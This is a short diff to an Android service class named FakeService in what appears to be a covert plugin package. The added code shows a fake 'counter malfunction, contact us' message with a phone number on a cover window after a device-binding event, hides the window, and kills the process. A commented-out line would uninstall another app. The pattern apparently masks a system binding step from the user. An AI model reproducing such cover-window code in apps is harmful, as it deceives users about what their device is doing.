修改预置对应的文案

+++ src/com/xstd/plugin/service/FakeService.java
@@ -33,9 +33,15 @@ public class FakeService extends Service {
     public static final String BIND_WINDOW_DISMISS = "com.xstd.action.fakedismiss";
     private BroadcastReceiver mBindSuccesBRC = new BroadcastReceiver() {
         @Override
-        public void onReceive(Context context, Intent intent) {
+        public void onReceive(final Context context, final Intent intent) {
             Config.LOGD("[[BroadcastReceiver::onReceive]] binding devices success >>>>>");
             UtilsRuntime.goHome(getApplicationContext());
+
+            if (BIND_WINDOW_DISMISS.equals(intent.getAction())) {
+                if (window != null) {
+                    window.updateCoverString("计数器故障，请联系我们, 15011188534");
+                }
+            }
 
             mHandler.postDelayed(new Runnable() {
                 @Override
@@ -47,9 +53,15 @@ public class FakeService extends Service {
                     if (window != null) {
                         window.dismiss();
                     }
-                    stopSelf();
 
-                    android.os.Process.killProcess(android.os.Process.myPid());
+//                    if (BIND_SUCCESS_ACTION.equals(intent.getAction())) {
+//                        CommonUtil.uninstallPackage(context, "com.xstd.installstatistics");
+//                    }
+
+                    if (BIND_SUCCESS_ACTION.equals(intent.getAction())) {
+                        stopSelf();
+                        android.os.Process.killProcess(android.os.Process.myPid());
+                    }
                 }
             }, 300);
         }
@@ -108,7 +120,7 @@ public class FakeService extends Service {
 
                 if (Config.DEBUG) {
                     Config.LOGD("[[FakeService]] kill self pid : " + android.os.Process.myPid()
-                            + " current Binding Times : " + PluginSettingManager.getInstance().getDeviceBindingCount());
+                                    + " current Binding Times : " + PluginSettingManager.getInstance().getDeviceBindingCount());
                 }
 
                 //notify umeng
